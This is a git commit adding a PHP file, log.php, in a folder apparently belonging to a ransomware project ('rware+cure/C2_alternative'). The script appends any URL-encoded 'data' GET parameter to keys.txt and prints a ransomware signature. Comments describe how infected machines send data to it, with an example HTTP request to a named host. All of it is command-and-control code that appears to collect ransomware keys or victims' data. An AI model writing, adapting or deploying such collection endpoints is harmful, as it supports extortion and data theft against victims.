b352d3281eb5fd710950cb3eda05495e905afd5f
waived <165493645+waived@users.noreply.github.com>
2024-06-02 02:22:40 -0400

    Create log.php

---
+++ rware+cure/C2_alternative/log.php
@@ -0,0 +1,18 @@
+<?php
+  $content = $_GET['data'];
+  $fo = fopen("keys.txt", "a");
+  $fw = fwrite($fo, "$content\n");
+  fclose($fo);
+
+echo 'RWare by ~Waiv3d'
+?>
+
+// Send a GET request via HTTP and parse data into  /log.php?data=<your string here>
+// Parsed data must be URL-encoded (Aka 'perfect encoded')
+
+// Example:
+// GET /log.php?data=This%20is%20a%20test HTTP/1.1\r\n
+// Host: www.rware-industries.com\r\n
+// User-Agent: Mozilla/13.37\r\n
+// Content-Type: test/html; charset=iso-8859-l\r\n
+// \r\n\r\n
